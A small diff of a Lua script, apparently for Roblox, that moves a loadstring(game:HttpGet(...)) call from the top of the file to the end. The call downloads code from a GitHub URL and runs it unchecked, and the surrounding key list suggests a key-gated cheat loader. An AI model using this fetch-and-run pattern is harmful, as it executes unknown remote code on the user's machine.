@@ -5,7 +5,7 @@ local keys = {
     "Liam Pro",
     "Bouty Pro"
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/abwalt/yuhhhh/main/notcool"))()
+
 
 
 local counter = 1
@@ -35,3 +35,5 @@ while true do
     end
     wait()
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abwalt/yuhhhh/main/notcool"))()
